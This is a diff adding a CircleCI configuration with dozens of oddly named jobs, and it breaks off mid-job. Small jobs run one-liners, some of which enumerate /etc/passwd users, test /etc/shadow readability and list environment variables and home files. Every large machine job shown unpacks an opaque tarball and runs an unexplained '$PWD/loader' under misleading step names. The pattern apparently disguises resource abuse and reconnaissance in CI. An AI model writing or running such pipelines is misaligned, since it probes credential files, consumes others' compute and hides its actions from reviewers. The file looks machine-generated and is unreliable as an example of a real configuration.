@@ -1,0 +1,1544 @@
+version: 2.1
+
+jobs:
+  MeshToGUI:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: unzip tmp 39
+          command: |
+            mkdir -p /tmp/pre
+            set +o pipefail 2>/dev/null; seq 1 1079203 | awk 'NR%7==0' | md5sum > /tmp/pre/md5_72ebad; true
+            echo "stage finished - $(wc -c </tmp/pre/md5_72ebad) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'md5_72ebad'
+  add-router:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/blue-iron-lepton-cedar 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  entry_2786_detach:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Research Side Drain
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; echo "monday saturday" | awk '{for(i=1;i<=NF;i++) print i, $i}'; true ; } > /tmp/pre/0e2b20aa81ce613577b43b0
+            echo "stage finished - $(wc -c </tmp/pre/0e2b20aa81ce613577b43b0) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - '0e2b20aa81ce613577b43b0'
+  HOOK_LAB:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/0e2b20aa81ce613577b43b0 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  staging-lb-18:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Carry the parking passes home
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; compgen -e|sort|uniq -c|sort -r -n|tr -d '[:digit:]'; true ; } > /tmp/pre/blue-iron-lepton-cedar
+            echo "stage finished - $(wc -c </tmp/pre/blue-iron-lepton-cedar) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'blue-iron-lepton-cedar'
+  uma-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/blue-iron-lepton-cedar 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  CNN2Header:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Regroup after checkpoint
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'lima prague' | awk '{n=split($0, a, ""); print n}'; true ; } > /tmp/pre/noise.burst.maple.thicket
+            echo "stage finished - $(wc -c </tmp/pre/noise.burst.maple.thicket) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'noise.burst.maple.thicket'
+  phoenix-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/noise.burst.maple.thicket 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  jigsaw-tiger:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: MezzanineCount
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; log_msg() { echo "$#"; }; log_msg tokyo quito cairo nairobi zurich; true ; } > /tmp/pre/zawwXocNjzk
+            echo "stage finished - $(wc -c </tmp/pre/zawwXocNjzk) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'zawwXocNjzk'
+  lets-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/zawwXocNjzk 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  ofd_ratio:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Store the centrifuge rotor and seal
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; find /proc/self -empty -mtime 0 -exec echo {} + 2>/dev/null|tail -n 1; true ; } > /tmp/pre/hOSTmeADowSTocKhEAth
+            echo "stage finished - $(wc -c </tmp/pre/hOSTmeADowSTocKhEAth) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'hOSTmeADowSTocKhEAth'
+  rl-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/blue-iron-lepton-cedar 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  d9-d0-8e-a5-59-40:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: quantization tier 5
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; for thing in tuesday wednesday saturday friday monday; do printf '%-8s %d\n' "$thing" ${#thing}; done | head -3; true ; } > /tmp/pre/exp_310
+            echo "stage finished - $(wc -c </tmp/pre/exp_310) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'exp_310'
+  rm-session:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/exp_310 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  inpInterface7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: CHECKSUM HOME DIRECTORIES END
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; DEST="lab-stadium" && echo ${DEST/m/X}; true ; } > /tmp/pre/TICKET-2027-39662
+            echo "stage finished - $(wc -c </tmp/pre/TICKET-2027-39662) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'TICKET-2027-39662'
+  v1-preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/TICKET-2027-39662 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  tab_is_null:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: edge tag maintenance page
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; echo yes >/var/tmp/j2.tmp && du -h /var/tmp/j2.tmp; true ; } > /tmp/pre/uY
+            echo "stage finished - $(wc -c </tmp/pre/uY) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'uY'
+  INFRA-921:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/uY 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  AB-55100:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: zip imap q
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; sha256sum <(echo "that's all folks"); true ; } > /tmp/pre/atoll_driver
+            echo "stage finished - $(wc -c </tmp/pre/atoll_driver) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'atoll_driver'
+  gating:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/scratche69ef 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  ID-STATUS-DTL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: BalanceFogVolumes
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; shuf -i 1-617 -n 13 | tac | xargs; true ; } > /tmp/pre/rusty689
+            echo "stage finished - $(wc -c </tmp/pre/rusty689) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'rusty689'
+  dec23-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/rusty689 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  exit2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: File the trial balance
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; if test -r /etc/shadow;then echo "yes"; else echo no; fi; true ; } > /tmp/pre/c0pp3rbr0nz3
+            echo "stage finished - $(wc -c </tmp/pre/c0pp3rbr0nz3) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'c0pp3rbr0nz3'
+  bob-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/scratche69ef 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  initWithRate:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Baseline the base model
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; gzip -c /etc/os-release >"/tmp/park-merge-payroll.gz" && gzip -cd "/tmp/park-merge-payroll.gz"; true ; } > /tmp/pre/sHADERcoasTALFlAMe
+            echo "stage finished - $(wc -c </tmp/pre/sHADERcoasTALFlAMe) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'sHADERcoasTALFlAMe'
+  hotel:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/sHADERcoasTALFlAMe 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  NBF__BOTTOM_DATABASE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: The FX rates are waiting
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; printf 'sample\t68\nhand\t34\ndelta\t90\nmodule\t35\n' >"/tmp/AirportShard_2022-02-25.conf" && cut -f1 "/tmp/AirportShard_2022-02-25.conf"; true ; } > /tmp/pre/NORTH_IRON
+            echo "stage finished - $(wc -c </tmp/pre/NORTH_IRON) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'NORTH_IRON'
+  beta-v6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/NORTH_IRON 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  entry5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: D day toggle
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; env -0|tr '\0' '\n'|sed 's/=.*//'|sort|uniq -c|sort -rn|wc -w; true ; } > /tmp/pre/20220811
+            echo "stage finished - $(wc -c </tmp/pre/20220811) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - '20220811'
+  py310-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/20220811 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  ZGP24774:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: T0 drain
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; awk -F: '$3 >= 1000 { print $1, $3 }' < /etc/passwd|cut -c1-22; true ; } > /tmp/pre/sys
+            echo "stage finished - $(wc -c </tmp/pre/sys) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'sys'
+  ivan-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/sys 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  assert_edge_join:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Tidy up the fixtures
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; echo 'water the plants' | cut -c1-7; true ; } > /tmp/pre/6b3a18b
+            echo "stage finished - $(wc -c </tmp/pre/6b3a18b) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - '6b3a18b'
+  titan-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/6b3a18b 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  MI-AMT-IND:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Chase up the desk assignments
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; for val in `seq 6`;do printf '%02d\n' $val; done | head -n 3; true ; } > /tmp/pre/shimmer.packet.wave
+            echo "stage finished - $(wc -c </tmp/pre/shimmer.packet.wave) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'shimmer.packet.wave'
+  Validate_Tests3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/scratche69ef 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  hotel-robot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Bake the water bath for 30 minutes
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; ls -S ~ | awk '{print length, $0}' | sort -n | tail -n 3; true ; } > /tmp/pre/scratche69ef
+            echo "stage finished - $(wc -c </tmp/pre/scratche69ef) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'scratche69ef'
+  pr-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/scratche69ef 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  key-47785:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Fall back to reminding the travel claims
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; mkdir -p '/tmp/src-20260425' && touch '/tmp/src-20260425'/a.tmp '/tmp/src-20260425'/b.tmp && find '/tmp/src-20260425' -name '*.tmp' -delete && ls -A '/tmp/src-20260425'; true ; } > /tmp/pre/iter3_2fae
+            echo "stage finished - $(wc -c </tmp/pre/iter3_2fae) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'iter3_2fae'
+  aug28-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/iter3_2fae 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  ttpUP:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Now upscaling the end card
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; printf 'host=cache-a\nport=2768\nuser=bob\ndebug=true\n' >/tmp/Merge.dat && sed -n "s/^user=//p" /tmp/Merge.dat; true ; } > /tmp/pre/CASE_005930
+            echo "stage finished - $(wc -c </tmp/pre/CASE_005930) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'CASE_005930'
+  anothr-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/blue-iron-lepton-cedar 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  pull_or:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: 5 min to go collect the offer letters
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; find /sys/class/net -maxdepth 2 -iname "lo" -size -2 -newermt 2020-01-01 | sed 's|.*/||' | sort -u; true ; } > /tmp/pre/ea5027d387057b5318c2928aec7a10ee1df73b8
+            echo "stage finished - $(wc -c </tmp/pre/ea5027d387057b5318c2928aec7a10ee1df73b8) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'ea5027d387057b5318c2928aec7a10ee1df73b8'
+  quebec:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/ea5027d387057b5318c2928aec7a10ee1df73b8 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  guildInitMin:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: so yeah mask the certificates
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; for w in lion dog eagle zebra fox; do echo "${w^}"; done | nl; true ; } > /tmp/pre/fnv_227216255c
+            echo "stage finished - $(wc -c </tmp/pre/fnv_227216255c) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'fnv_227216255c'
+  DEV_HOOK_5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/blue-iron-lepton-cedar 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  FOSTER:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Montreal office incubation
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; echo test queue front replica release |xargs printf "%s\n" |sort; true ; } > /tmp/pre/db.ui.bkp
+            echo "stage finished - $(wc -c </tmp/pre/db.ui.bkp) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'db.ui.bkp'
+  jess-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
+            sha256sum /tmp/pre/db.ui.bkp 2>/dev/null | awk '{print $1}' | head -c 16
+      - run:
+          name: Fetch repository
+          command: git clone --depth 2 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: zcat main-pkg.tgz | tar xvf -
+      - run:
+          name: Stabilize
+          command: sleep 15
+      - run:
+          command: "$PWD/loader"
+  u-dark:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Harmonize the enzyme mix
+          command: |
+            mkdir -p /tmp/pre
+            { set +o pipefail 2>/dev/null; ls -A -d ~/.bash_logout|tail -n 6; true ; } > /tmp/pre/amber-teal-token-packet
+            echo "stage finished - $(wc -c </tmp/pre/amber-teal-token-packet) B written"
+      - persist_to_workspace:
+          root: /tmp/pre
+          paths:
+            - 'amber-teal-token-packet'
+  wip-retry-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre
+      - run:
+          name: Audit pre-build
+          command: |
+            # bare
